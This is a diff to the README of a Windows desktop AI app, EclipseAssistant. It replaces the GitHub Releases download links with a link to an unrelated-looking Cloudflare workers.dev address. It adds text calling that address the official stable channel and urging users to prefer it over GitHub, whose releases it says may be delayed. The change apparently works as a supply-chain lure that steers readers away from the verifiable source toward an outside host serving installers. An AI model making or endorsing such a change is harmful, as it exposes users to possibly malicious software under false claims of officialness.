@@ -2,7 +2,7 @@
 
 <h1 align="center">EclipseAssistant</h1>
 <p align="center">A focused desktop workspace for contextual AI.</p>
-<p align="center"><a href="https://github.com/EclipseReign/eclipse_assistant/releases/latest">Download for Windows</a> · <a href="https://github.com/EclipseReign/eclipse_assistant/releases">Release notes</a> · <a href="mailto:saint.john.bobby@gmail.com">Support</a></p>
+<p align="center"><a href="https://eclipseassistant.feedfix-cloudflare.workers.dev/updates/download">Download latest for Windows</a> · <a href="https://github.com/EclipseReign/eclipse_assistant/releases/latest">GitHub downloads</a> · <a href="mailto:saint.john.bobby@gmail.com">Support</a></p>
 
 ## Less switching. More context.
 
@@ -16,11 +16,13 @@ Bring selected screenshots, documents and conversation context into one minimal 
 
 ## Get started
 
-1. Download the installer from [Releases](https://github.com/EclipseReign/eclipse_assistant/releases/latest).
+1. Download the [latest stable installer](https://eclipseassistant.feedfix-cloudflare.workers.dev/updates/download) or use [GitHub Releases](https://github.com/EclipseReign/eclipse_assistant/releases/latest).
 2. Install EclipseAssistant, then sign in and confirm your email, or choose **Advanced / own keys**.
 3. Choose your model and audio mode, then press **Start Session**. Only capture or share material you are authorized to use.
 
 Current installers target Windows x64. Use your organization's meeting, privacy and assessment rules; this software does not grant permission to record another person or bypass an assessment policy.
+
+The direct download follows the official stable update channel. GitHub Releases are synchronized automatically every 10 minutes; GitHub scheduling can be delayed. Each complete release includes an installer, its matching GPL source archive and SHA-256 checksums. For the freshest release, use the direct download above.
 
 ## Privacy and support
 
